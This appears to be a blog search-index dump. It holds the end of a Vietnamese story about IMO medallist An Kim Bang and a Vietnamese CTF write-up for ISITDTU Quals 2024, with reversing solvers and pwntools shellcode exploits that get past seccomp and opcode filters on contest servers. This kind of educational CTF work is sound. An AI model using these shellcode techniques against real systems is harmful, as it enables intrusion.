kiểm tra nhỏ hay kỳ thi lớn, tôi luôn đứng đầu, toán thường được 100/100 điểm. Dưới sự khích lệ của mẹ, tôi càng học càng thấy ham thích. Tôi thực sự không hiểu trên đời còn có gì vui sướng hơn được học hành. Chưa đi học lớp một tôi đã thông thạo cộng trừ nhân chia và phân số, số phần trăm; khi học Tiểu học tôi đã tự học để nắm vững Toán Lý Hoá của bậc Trung học Phổ thông; Khi lên trung học, thành phố Thiên Tân tổ chức kỳ thi vật lý của bậc Trung học, tôi là đứa học trò nông thôn duy nhất của cả năm huyện ngoại thành Thiên Tân được giải, một trong ba người đỗ đầu. Tháng 6 năm đó, tôi được đặc cách vào thẳng trường Trung học số 1 danh tiếng của Thiên Tân, tôi vui sướng chạy như bay về nhà. Nào ngờ, khi tôi báo tin vui cho cả nhà, mặt bố mẹ chất chứa toàn những đau khổ; bà nội vừa mất nửa năm, ông nội đang gần kề cái chết, nhà tôi đã mắc nợ tới hơn mười nghìn Nhân dân tệ rồi. Tôi lặng lẽ quay về bàn học, nước mắt như mưa suốt một ngày. Đến tối, tôi nghe thấy ở ngoài nhà có tiếng ồn ào. Thì ra mẹ tôi đang định dắt con lừa con của nhà đi bán, cho tôi đi học, nhưng ba tôi không chịu. Tiếng ồn ào làm ông nội nghe thấy, ông đang bệnh nặng, trong lúc buồn bã ông đã lìa đời. Sau lễ an táng ông nội, nhà tôi lại mắc thêm vài nghìn tệ tiền nợ nữa. Tôi không còn dám nhắc đến việc đi học nữa, tôi cất “Giấy báo nhập học” thật kỹ vào vỏ gối, hàng ngày tôi ra đồng làm việc cùng mẹ. Sau hai hôm, tôi và ba tôi cùng lúc phát hiện ra: con lừa con biến mất rồi. Ba tôi sắt mặt lại, hỏi mẹ tôi: – Bà bán con lừa con rồi à? Bà bị thần kinh à? Sau này lấy gì kéo, lương thực hoa màu bà đẩy xe tay nhé, bà tự cõng nhé? Bà bán lừa một hai trăm bạc liệu cho nó học được một học kỳ hay là hai học kỳ? Hôm đó mẹ tôi khóc, mẹ tôi dùng một giọng rất dữ dội rất hung dữ để gào lại ba tôi: – Con cái mình đòi đi học thì có gì sai? Nó thi lên được trường số 1 của thành phố nó là đứa duy nhất của cả huyện này đấy, tôi không thể để cho tiền đồ của nó bị lỡ dở được. Tôi sẽ dùng tay đẩy, dùng lưng vác, để cho nó đi học… Cầm sáu trăm tệ mẹ vừa bán lừa, tôi thật sự chỉ muốn quỳ xuống dập đầu trước mẹ. Tôi đã thích được học quá rồi, mà còn học tiếp, thì mẹ sẽ khổ sở bao nhiêu, vất vả","date":"2024-11-25","objectID":"/jinpengan/:0:0","tags":["Blog","Mathematics"],"title":"Câu chuyện của Tiến sĩ An Kim Bằng - Huy chương vàng IMO năm 1997","uri":"/jinpengan/"},{"categories":null,"content":"Solutions for some challenges in ISITDTU Quals 2024 by ducdatdau","date":"2024-11-19","objectID":"/2024-isitdtu-quals/","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":" img { box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px; border-radius: 6px; display: block; margin: 15px auto; } ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:0:0","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"rev/animal Challenge Information 31 solves / 100 pts / by kinjazz Given files: animal.7z Description: Find the hidden animal ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:1:0","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"0x01 Overview Đề bài cho chúng ta một file PE64. Mở bằng IDA64, tổng quan chương trình sẽ như sau Chương trình yêu cầu nhập flag có độ dài 36 ký tự, trong đó có điều kiện check ở một số idex cụ thể. Khi click vào hàm check_flag, ta nhận được thông báo lỗi như sau Qua tab IDA View chế độ non-graph, ta thấy đây chỉ là một lệnh gọi hàm bình thường Vậy mình sẽ debug từng dòng và sửa các kết quả check để chương trình tới được đến đoạn này. Đây là chương trình khi mình nhảy vào rax Ấn phím p để create function và thu được đống mã giả của hàm này như sau _BOOL8 __fastcall sub_21871F785(char *a1) { [...] v2 = a1[27]; v3 = a1[1]; v4 = a1[32]; v5 = a1[8]; v6 = a1[29]; if ( v5 * v3 + v4 * v2 * a1[25] - v6 != 538738 ) return 0i64; v7 = a1[4]; v8 = a1[10]; v9 = a1[20]; if ( a1[7] + v9 * v8 * v7 - a1[6] - a1[11] != 665370 ) return 0i64; v10 = a1[30]; if ( a1[14] + (a1[16] - 1) * a1[31] - v10 * a1[22] != -2945 ) return 0i64; v11 = a1[18]; v12 = a1[33]; if ( v12 + a1[3] - a1[9] - v11 - a1[11] - v7 != -191 ) return 0i64; if ( v3 + v10 + v11 + a1[25] * v6 - v5 != 4853 ) return 0i64; v13 = a1[7]; v14 = a1[13]; if ( v14 + a1[5] - v13 * a1[14] * a1[23] * a1[2] != -86153321 ) return 0i64; v15 = a1[9]; if ( v14 + v15 * a1[5] * a1[12] + v2 * v8 != 873682 ) return 0i64; v16 = v15 * a1[21]; v17 = a1[6]; v18 = v11 * v16; v19 = a1[22]; if ( v19 + a1[3] + v18 - v17 != 451644 ) return 0i64; v20 = a1[24]; if ( a1[21] + a1[34] + v20 + v4 * a1[23] - v7 != 9350 ) return 0i64; v21 = a1[17]; v22 = a1[19]; v29 = a1[35]; v28 = a1[26]; if ( v20 + v29 + a1[17] - v22 - v28 - v17 != 27 ) return 0i64; v23 = a1[15]; if ( a1[14] + a1[13] + v23 + a1[23] * v22 - a1[3] == 11247 \u0026\u0026 (v24 = v13 * a1[12], v25 = a1[2], v25 + v21 + v24 - v23 - a1[21] == 13297) \u0026\u0026 (v26 = *a1, v5 + v29 + v28 + a1[28] - v26 - v9 == 266) \u0026\u0026 v25 + v21 + v26 + a1[12] * a1[28] - v3 == 10422 \u0026\u0026 v19 + v23 + a1[5] * v22 - a1[34] - a1[11] == 9883 ) { return v8 * v12 + a1[16] * (1 - v9) - v26 == -5604; } else { return 0i64; } } Tới đây chúng ta sẽ biết được phải dùng Z3 để tìm ra flag. ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:1:1","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"0x02 Final script from z3 import * solver = Solver() flag = [Int(f'flag[{i}]') for i in range(36)] for i in range(36): solver.add(flag[i] \u003e= 0, flag[i] \u003c= 128) solver.add(flag[0] == ord('I')) solver.add(flag[1] == ord('S')) solver.add(flag[2] == ord('I')) solver.add(flag[3] == ord('T')) solver.add(flag[4] == ord('D')) solver.add(flag[5] == ord('T')) solver.add(flag[6] == ord('U')) solver.add(flag[7] == ord('{')) solver.add(flag[8] == 0x61) solver.add(flag[17] == 0x63) solver.add(flag[18] == 0x61) solver.add(flag[19] == 0x74) solver.add(flag[33] == flag[34]) solver.add(flag[35] == ord('}')) solver.add(flag[22] + flag[3] + flag[18] * flag[9] * flag[21] - flag[6] == 451644) solver.add(flag[24] + flag[35] + flag[17] - flag[19] - flag[26] - flag[6] == 27) solver.add(flag[8] * flag[1] + flag[32] * flag[27] * flag[25] - flag[29] == 0x83872) solver.add(flag[7] + flag[20] * flag[10] * flag[4] - flag[6] - flag[11] == 665370) solver.add(flag[14] + (flag[16] - 1) * flag[31] - flag[30] * flag[22] == -2945) solver.add(flag[33] + flag[3] - flag[9] - flag[18] - flag[11] - flag[4] == -191) solver.add(flag[1] + flag[30] + flag[18] + flag[25] * flag[29] - flag[8] == 4853) solver.add(flag[13] + flag[5] - flag[7] * flag[14] * flag[23] * flag[2] == -86153321) solver.add(flag[13] + flag[9] * flag[5] * flag[12] + flag[27] * flag[10] == 873682) solver.add(flag[21] + flag[34] + flag[24] + flag[32] * flag[23] - flag[4] == 9350) solver.add(flag[14] + flag[13] + flag[15] + flag[23] * flag[19] - flag[3] == 11247) solver.add(flag[2] + flag[17] + flag[7] * flag[12] - flag[15] - flag[21] == 13297) solver.add(flag[8] + flag[35] + flag[26] + flag[28] - flag[0] - flag[20] == 266) solver.add(flag[2] + flag[17] + flag[0] + flag[12] * flag[28] - flag[1] == 10422) solver.add(flag[22] + flag[15] + flag[5] * flag[19] - flag[34] - flag[11] == 9883) solver.add(flag[10] * flag[33] + flag[16] * (1 - flag[20]) - flag[0] == -5604) if solver.check() == sat: model = solver.model() print(model) else: print(\"0xDEADBEEF\") flag[0] = 73 flag[1] = 83 flag[2] = 73 flag[3] = 84 flag[4] = 68 flag[5] = 84 flag[6] = 85 flag[7] = 123 flag[8] = 97 flag[17] = 99 flag[18] = 97 flag[19] = 116 flag[35] = 125 flag[33] = 33 flag[13] = 100 flag[12] = 108 flag[26] = 117 flag[22] = 110 flag[21] = 49 flag[20] = 95 flag[27] = 114 flag[23] = 95 flag[29] = 97 flag[10] = 103 flag[11] = 48 flag[32] = 97 flag[15] = 110 flag[31] = 101 flag[16] = 95 flag[30] = 114 flag[9] = 95 flag[14] = 101 flag[28] = 95 flag[25] = 48 flag[34] = 33 flag[24] = 121 print(\"\".join([chr(i) for i in flag])) FLAG: ISITDTU{a_g0lden_cat_1n_y0ur_area!!} ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:1:2","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"rev/re01 Challenge Information 46 solves / 100 pts Given files: re01.zip Description: VC++ ;) ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:2:0","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"0x01 Overview Đề bài cho chúng ta một file PE64, mở bằng IDA64, quan sát tổng thể ta có thể thấy chương trình dùng SHA1 để hash input và so sánh với chuỗi hash eeeddf4ae0c3364f189a37f79c9d7223a1d60ac7 Sau một hồi thử crack chuỗi hash kia không được, mình tiếp tục đi xem có function nào đáng nghi không. Và đây chính là hàm mà mình chú ý tới TlsCallback_0 Chương trình sử dụng anti-debug và gọi nó trong hàm TLS. Mình đặt breakpoint ở đoạn check IsDebuggerPresent và sửa giá trị cho ZF để chương trình tiếp tục được đi vào trong hàm sub_140004000 Chúng ta dễ dàng nhận ra input length = 58. Mình sẽ tạo mới input và debug lại. Kiểm tra các giá trị ở đoạn so sánh, ta biết được điều kiện check flag sẽ là flag[i] ^ 0x35 == v7[i] ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:2:1","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"0x02 Final script Dễ dàng lấy toàn bộ giá trị của v7 và xor ngược lại, ta thu được kết quả. X = [0x7C, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0x7C, 0x00, 0x00, 0x00, 0x61, 0x00, 0x00, 0x00, 0x71, 0x00, 0x00, 0x00, 0x61, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x4E, 0x00, 0x00, 0x00, 0x76, 0x00, 0x00, 0x00, 0x5A, 0x00, 0x00, 0x00, 0x5B, 0x00, 0x00, 0x00, 0x52, 0x00, 0x00, 0x00, 0x47, 0x00, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x41, 0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 0x6A, 0x00, 0x00, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x5A, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x6A, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0x5A, 0x00, 0x00, 0x00, 0x59, 0x00, 0x00, 0x00, 0x43, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x51, 0x00, 0x00, 0x00, 0x6A, 0x00, 0x00, 0x00, 0x61, 0x00, 0x00, 0x00, 0x79, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0x6A, 0x00, 0x00, 0x00, 0x76, 0x00, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x59, 0x00, 0x00, 0x00, 0x59, 0x00, 0x00, 0x00, 0x57, 0x00, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x56, 0x00, 0x00, 0x00, 0x5E, 0x00, 0x00, 0x00, 0x6A, 0x00, 0x00, 0x00, 0x67, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x6A, 0x00, 0x00, 0x00, 0x7D, 0x00, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x43, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x6A, 0x00, 0x00, 0x00, 0x73, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x5B, 0x00, 0x00, 0x00, 0x6A, 0x00, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00] flag = \"\".join([chr(0x35 ^ int.from_bytes(X[i:i+4], \"little\")) for i in range(0, len(X), 4)]) print(flag) FLAG: ISITDTU{Congrats_You_Solved_TLS_Callback_Re01_Have_Fun_:)} ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:2:2","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"rev/re02 Challenge Information 29 solves / 100 pts Given files: re02.zip Description: NES, good luck ;) ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:3:0","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"0x01 Static Analysis Đề bài cho chúng ta một file re02.nes, đây là một Nintendo ROM image file. Sau một hồi tìm kiếm, mình tìm được tool FCEUX có thể emulate và debug file này. Mở chương trình lên thì thấy một màn hình đen kịt Vào tab Debug → Hex Editor thấy 3 byte đầu nhảy liên tục, chứng tỏ rằng chương trình vẫn đang hoạt động bình thường. Sau khi thử nhập một vài phím và check toàn bộ dữ liệu trong tab Hex Editor, mình phát hiện input được xuất hiện ở các địa chỉ: 0x0300 0x0B00 0x1300 0x1B00 và có một số đặc điểm như sau: Độ dài tối đa input là 16 Có 7 phím được chấp nhận và nó sẽ được map như sau: s → a d → u f → t up arrow → n right arrow → i down arrow → h left arrow → l Sau khi đã biết chỗ nhập input thì chỗ check flag sẽ nằm ở đâu? Mình vào tab Debug → Debugger, tìm đoạn code nào có chứa 300 (địa chỉ input) hoặc lệnh cmp thì ra được đoạn này Nếu tinh ý, ta có thể nhận ra các block check input khá tương tự nhau. Lấy các giá trị ở địa chỉ 300, 301 và 302 cộng với nhau, sau đó so sánh với 0x4A. Ví dụ cho block check đầu tiên sẽ là input[0] + input[1] + input[2] == 0x4A Thực hiện tương tự cho các block sau, chúng ta có thể tìm ra được mapped_input bằng Z3. ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:3:1","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"0x02 Final script from z3 import * solver = Solver() flag = [BitVec(f'flag[{i}]', 8) for i in range(16)] for i in range(16): solver.add(Or((flag[i] == ord('t')), (flag[i] == ord('u')), (flag[i] == ord('a')), (flag[i] == ord('n')), (flag[i] == ord('l')), (flag[i] == ord('i')), (flag[i] == ord('h')))) solver.add(flag[0] + flag[1] + flag[2] == 0x4A) solver.add(flag[1] + flag[2] + flag[3] == 0x44) solver.add(flag[2] + flag[3] + flag[4] == 0x3B) solver.add(flag[3] + flag[4] + flag[5] == 0x43) solver.add(flag[4] + flag[5] + flag[6] == 0x43) solver.add(flag[5] + flag[6] + flag[7] == 0x3F) solver.add(flag[6] + flag[7] + flag[8] == 0x42) solver.add(flag[7] + flag[8] + flag[9] == 0x3D) solver.add(flag[8] + flag[9] + flag[10] == 0x43) solver.add(flag[9] + flag[10] + flag[11] == 0x3F) solver.add(flag[10] + flag[11] + flag[12] == 0x4A) solver.add(flag[11] + flag[12] + flag[13] == 0x51) solver.add(flag[12] + flag[13] + flag[14] == 0x4A) solver.add(flag[13] + flag[14] + flag[15] == 0x44) if solver.check() == sat: model = solver.model() res = \"\" for i in range(16): res += chr(model[flag[i]].as_long()) print(res) else: print(\"......\") Kết quả thu được là tuanlinhlinhtuan, bây giờ ta chỉ cần nhập input đúng với các key đã được map sẽ có được đáp án chính xác. FLAG: ISITDTU{Throw_back_the_nested_if_NES_have_funnnn_:)} ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:3:2","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"rev/The Chamber of Flag Challenge Information 28 solves / 100 pts / by ks75vl Given files: TheChamberOfFlag_11BA527D91D85F332DEBC3145E3E1C4A.zip Description: Try to unlock the Chamber and get the Flag. ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:4:0","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"0x01 Overview Đề bài cho chúng ta một file PE64, chạy thử chương trình, ta thấy có 2 option để lựa chọn: login → input secret key about Mình thử nhập secret và nhận thấy: Độ dài secret = 6 Nhập sai sẽ cho nhập tiếp Mở file bằng IDA64, chương trình nhìn rất lớn và phức tạp. Mình nhảy qua tab string và nhận thấy chương trình có gọi các hàm encrypt của WinAPI. ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:4:1","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"0x02 Dynamic Analysis Trace theo các hàm phía trên, mình tìm ra được hàm sub_7FF6A0F51530 thực hiện việc mã hóa input và đi kiểm tra tính hợp lệ của nó. Sau khi debug và decrypt AlgId, chúng ta biết được chương trình sử dụng hash SHA256. Thông tin chi tiết các bạn có thể đọc thêm ở đây https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptopenalgorithmprovider Tiếp tục debug và ta lấy được checked_hash = 26F2D45844BFDBC8E5A2AE67149AA6C50E897A2A48FBF479D1BFB9F0D4E24544 Với input có độ dài 6 ký tự, mình sẽ dùng hashcat để bruteforce nhằm tìm ra giá trị tương ứng với mã hash này. Kết quả thu được là 808017 Đăng nhập thành công, chúng ta chọn option flag nhưng lại xuất hiện thông báo flag crashed. Sau khi xref chuỗi trên, mình tìm ra được đoạn code có liên quan tới chuỗi trên ở đây. Đi phân tích hàm sub_7FF7AFB110C8, ta thấy nó decrypt dữ liệu bằng thuật toán AES mode CBC. __int64 __fastcall sub_7FF7AFB110C8(PUCHAR pbInput, __int64 a2, __int64 a3, UCHAR *a4, PUCHAR a5) { char v7; // al unsigned __int64 v8; // rcx unsigned __int64 v9; // rcx char v10; // al char v11; // bl char v12; // al unsigned __int64 v13; // rcx unsigned __int64 v14; // rcx unsigned int v15; // ebx HANDLE ProcessHeap; // rax UCHAR *v17; // rbx HANDLE v18; // rax WCHAR pszProperty[2]; // [rsp+50h] [rbp-61h] BYREF int v21; // [rsp+54h] [rbp-5Dh] int v22; // [rsp+58h] [rbp-59h] int v23; // [rsp+5Ch] [rbp-55h] int v24; // [rsp+60h] [rbp-51h] int v25; // [rsp+64h] [rbp-4Dh] int v26; // [rsp+68h] [rbp-49h] WCHAR pszAlgId[2]; // [rsp+70h] [rbp-41h] BYREF int v28; // [rsp+74h] [rbp-3Dh] __int16 v29; // [rsp+78h] [rbp-39h] char v30; // [rsp+80h] [rbp-31h] char v31; // [rsp+81h] [rbp-30h] UCHAR pbInputa[4]; // [rsp+82h] [rbp-2Fh] BYREF int v33; // [rsp+86h] [rbp-2Bh] int v34; // [rsp+8Ah] [rbp-27h] int v35; // [rsp+8Eh] [rbp-23h] int v36; // [rsp+92h] [rbp-1Fh] int v37; // [rsp+96h] [rbp-1Bh] int v38; // [rsp+9Ah] [rbp-17h] int v39; // [rsp+9Eh] [rbp-13h] BCRYPT_ALG_HANDLE phAlgorithm; // [rsp+A8h] [rbp-9h] BYREF BCRYPT_KEY_HANDLE phKey; // [rsp+B0h] [rbp-1h] BYREF UCHAR pbOutput[4]; // [rsp+B8h] [rbp+7h] BYREF ULONG pcbResult; // [rsp+BCh] [rbp+Bh] BYREF ULONG v44; // [rsp+C0h] [rbp+Fh] BYREF phAlgorithm = 0i64; phKey = 0i64; *(_DWORD *)pbOutput = 0; v7 = 98; pcbResult = 0; *(_DWORD *)pszAlgId = '#\\0b'; // AES v8 = 0i64; v28 = 3211303; v29 = 0; while ( 1 ) { pszAlgId[++v8] ^= v7; if ( v8 \u003e= 3 ) break; v7 = pszAlgId[0]; } v29 = 0; if ( BCryptOpenAlgorithmProvider(\u0026phAlgorithm, \u0026pszAlgId[1], 0i64, 0) ) return 0i64; v9 = 0i64; *(_DWORD *)pbInputa = 6881346; // ChangingModeCBC v10 = 1; v31 = 0; v30 = 1; v33 = 6815840; v11 = 111; v34 = 6815855; v35 = 6684783; v36 = 7209036; v37 = 6553701; v38 = 4390978; v39 = 66; while ( 1 ) { *(_WORD *)\u0026pbInputa[2 * v9++] ^= v10; if ( v9 \u003e= 0xF ) break; v10 = v30; } HIWORD(v39) = 0; v12 = 41; *(_DWORD *)pszProperty = 6946857; v13 = 0i64; v21 = 4718657; v22 = 4653120; v23 = 4653120; v24 = 6553678; v25 = 5046342; v26 = 76; while ( 1 ) { pszProperty[++v13] ^= v12; if ( v13 \u003e= 0xC ) break; v12 = pszProperty[0]; } HIWORD(v26) = 0; if ( BCryptSetProperty(phAlgorithm, \u0026pszProperty[1], pbInputa, 0x20u, 0) ) return 0i64; *(_DWORD *)pszProperty = 2097263; // objectLength v21 = 327693; v14 = 0i64; v22 = 786442; v23 = 2293787; v24 = 65546; v25 = 1769480; v26 = 7; while ( 1 ) { pszProperty[++v14] ^= v11; if ( v14 \u003e= 0xC ) break; v11 = pszProperty[0]; } HIWORD(v26) = 0; if ( BCryptGetProperty(phAlgorithm, \u0026pszProperty[1], pbOutput, 4u, \u0026pcbResult, 0) ) return 0i64; v15 = *(_DWORD *)pbOutput; ProcessHeap = GetProcessHeap(); v17 = (UCHAR *)HeapAlloc(ProcessHeap, 0, v15); if ( !v17 ) return 0i64; if ( BCryptGenerateSymmetricKey(phAlgorithm, \u0026phKey, v17, *(ULONG *)pbOutput, \u0026pbSecret, 0x20u, 0) ) return 0i64; v44 = 16; if ( BCryptDecrypt(phKey, pbInput, 0x10u, 0i64, a4, 0x10u, a5, 0x10u, \u0026v44, 0) ) return 0i64; BCryptDestroyKey(phKey); BCryptCloseAlgorithmProvider(phAlgorithm, 0); v18 = GetProcessHeap(); HeapFree(v18, 0, v17); return 1i","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:4:2","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"pwn/shellcode 1 Challenge Information 68 solves / 100 pts / by code016hiro Given files: shellcode1.rar Description: nc 152.69.210.130 3001 ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:5:0","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"0x01 Overview Về tổng quan, chương trình đọc flag, lưu nó trên 1 vùng nhớ được mmap rồi xóa flag đó đi. Chương trình tiếp tục mmap một vùng nhớ mới với full quyền rwx và cho phép thực thi shellcode đó. Khi nhảy vào shellcode, check vmmap, ta có thể thấy được vùng nhớ lưu flag nằm ngay dưới shellcode và cách nhau 0x1000 byte. Vậy nếu ta sử dụng được syscall write thì hoàn toàn có thể đọc được flag. Kiểm tra seccomp, ta thấy các syscall như read, write, open, execve, openat đều không được phép sử dụng. ❯ seccomp-tools dump ./challenge Some gift for you: 0x7fd1042216f0 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0a 0xc000003e if (A != ARCH_X86_64) goto 0012 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u003c 0x40000000) goto 0005 0004: 0x15 0x00 0x07 0xffffffff if (A != 0xffffffff) goto 0012 0005: 0x15 0x06 0x00 0x00000000 if (A == read) goto 0012 0006: 0x15 0x05 0x00 0x00000001 if (A == write) goto 0012 0007: 0x15 0x04 0x00 0x00000002 if (A == open) goto 0012 0008: 0x15 0x03 0x00 0x0000003b if (A == execve) goto 0012 0009: 0x15 0x02 0x00 0x000000f0 if (A == mq_open) goto 0012 0010: 0x15 0x01 0x00 0x00000101 if (A == openat) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x06 0x00 0x00 0x00000000 return KILL Để bypass được các hạn chế phía trên, mình sẽ sử dụng syscall writev thay thế cho write để đọc flag. ssize_t writev(int fd, const struct iovec *iov, int iovcnt) trong đó iovec có cấu trúc như sau struct iovec { void *iov_base; /* Starting address */ size_t iov_len; /* Number of bytes to transfer */ }; Vậy mình sẽ chỉ định cho iov_base là địa chỉ vùng nhớ chứa flag, iov_len là 0x100. Khi nhảy vào shellcode, rdx chứa giá trị của địa chỉ shellcode. Vậy nên địa chỉ của vùng nhớ flag sẽ là rdx + 0x1000. ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:5:1","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"0x02 Final script #!/usr/bin/env python3 from pwn import * exe = ELF(\"./challenge_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-linux-x86-64.so.2\") context.update(os = \"linux\", arch = \"amd64\", log_level = \"debug\", terminal = \"cmd.exe /c start wsl\".split(), binary = exe) # p = process(exe.path) p = remote(\"152.69.210.130\", 3001) sl = p.sendline sa = p.sendafter sla = p.sendlineafter rl = p.recvline ru = p.recvuntil ru(b\"Some gift for you: \") libc_leak = int(rl().strip(), 16) libc_base = libc_leak - libc.symbols[\"printf\"] log.info(f\"libc leak = {hex(libc_leak)}\") payload = asm(\"\"\" add rdx, 0x1000 mov rax, 0x100 push rax push rdx mov rdi, 1 mov rsi, rsp mov rdx, 1 mov rax, 0x14 syscall \"\"\") p.send(payload) p.interactive() FLAG: ISITDTU{061e8c26e3cf9bfad4e22879994048c8257b17d8} ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:5:2","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"pwn/shellcode 2 Challenge Information 61 solves / 100 pts / by code016hiro Given files: shellcode2.rar Description: nc 152.69.210.130 3002 ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:6:0","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"0x01 Overview Dễ thấy chương trình mmap một vùng nhớ ở địa chỉ 0xAABBCC00 có kích thước 0x1000 byte với toàn bộ quyền rwx. int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+Ch] [rbp-4h] init(argc, argv, envp); read_flag(); addr = mmap((void *)0xAABBCC00LL, 0x1000uLL, 7, 34, -1, 0LL); if ( addr == (void *)-1LL ) { perror(\"mmap\"); return 1; } else { puts(\"\u003e\"); read(0, addr, 0x1000uLL); for ( i = 0; i \u003c= 4095; ++i ) { if ( (*((_BYTE *)addr + i) \u0026 1) == 0 ) *((_BYTE *)addr + i) = 0x90; } ((void (*)(void))addr)(); return 0; } } Những opcode chẵn trong shellcode sẽ bị thay đổi thành nop làm cho nó không hoạt động được. Có một bài write-up của giải UIUCTF 2022 nói rất chi tiết về việc build lại toàn bộ các instruction với opcode lẻ cần thiết cho việc lấy shell mà các bạn có thể tham khảo. Mình sẽ giải bài này với hướng tiếp cận khác so với write-up phía trên. Chúng ta có thể thấy, khi chương trình chuẩn bị nhảy vào shellcode, các giá trị của các thanh ghi như rax, rdi, rsi và rdx đều hợp lệ cho việc gọi syscall read. Vậy payload đầu tiên chúng ta chỉ cần gọi syscall để chương trình tiếp tục được nhập input lần thứ hai. Vì đã pass qua vòng for check opcode chẵn lẻ, nên tại lần nhập thứ hai này, ta chỉ cần viết shellcode lấy shell như thông thường. ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:6:1","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"0x02 Final script #!/usr/bin/env python3 from pwn import * exe = ELF(\"./challenge\") # libc = ELF(\"./libc.so.6\") # ld = ELF(\"./ld-2.35.so\") context.update(os = \"linux\", arch = \"amd64\", log_level = \"debug\", terminal = \"cmd.exe /c start wsl\".split(), binary = exe) # p = process(exe.path) p = remote(\"152.69.210.130\", 3002) sl = p.sendline sa = p.sendafter sla = p.sendlineafter rl = p.recvline ru = p.recvuntil payload1 = asm(\"\"\" syscall \"\"\") sa(b\"\u003e\\n\", payload1) payload2 = 